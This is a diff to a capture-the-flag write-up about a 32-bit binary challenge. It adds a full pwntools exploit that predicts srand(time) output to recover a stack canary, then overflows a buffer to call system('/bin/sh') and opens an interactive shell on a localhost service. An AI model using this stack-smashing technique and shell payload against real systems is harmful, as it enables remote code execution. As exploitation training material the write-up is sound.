@@ -81,10 +81,10 @@ The code of the program is:
 08049187      system(line: "echo `date` >> log")
 08049192      return 0
 ```
-Note: The code for the rest of the functions is not neccecry for the solution of the challnge, we just need to know what they do.
 
 ## Analysis
 
+The 
 The canary is set in these lines:
 ```asm
 .text:08048EDF                 mov     eax, large gs:14h
@@ -106,16 +106,51 @@ So we have:
 
 so the array starts at `[ebp-0x2x]` which is ebp-44 and its size is 8 so its total size is 32 bytes, which means the arr[8] is in address ebp-12 (44-32=12) which in hex is `[ebp-0xc]`, and thats where the canary is saved.
 
-### main
-
-### process_hash
-
-The function get input from the user until he use enter. Than it copies 1024 bytes (chars) from `stdin` to the address `0x804b0e0`, and than it sets the first 512 bytes of `0x804b0e0` to `0`.
-
 ## Exploit Code
 
 ```python
+from pwn import *
+import ctypes
+import time
 
+context.log_level = 'info'
+
+libc = ctypes.CDLL("libc.so.6")
+libc.srand.argtypes = (ctypes.c_uint,)
+libc.rand.restype = ctypes.c_int
+
+seed = int(time.time())
+libc.srand(seed)
+
+vals = [libc.rand() for _ in range(8)]
+
+result = vals[5] + vals[1] + vals[2] - vals[3] + vals[7] + vals[4] - vals[6]
+print("result:", result)
+
+p = remote('localhost', 9002)
+
+p.recvuntil(b'captcha : ')
+captcha = int(p.recv().decode())
+p.sendline(str(captcha))
+print("captcha:", captcha)
+
+canary = captcha - result
+canary = canary & 0xffffffff
+canary = p32(canary)
+print("canary:", canary)
+
+call_system_addr = p32(0x8049187)
+print("call system address:", call_system_addr)
+
+binsh_addr = p32(0x804B3AC)
+print("/bin/sh address:", binsh_addr)
+
+payload = b'A' * 512 + canary + b'A' * 12 + call_system_addr + binsh_addr
+payload = b64e(payload).encode() + b'/bin/sh\0'
+
+p.recvuntil(b'Encode your data with BASE64 then paste me!\n')
+p.sendline(payload)
+p.interactive()
 ```
 
 
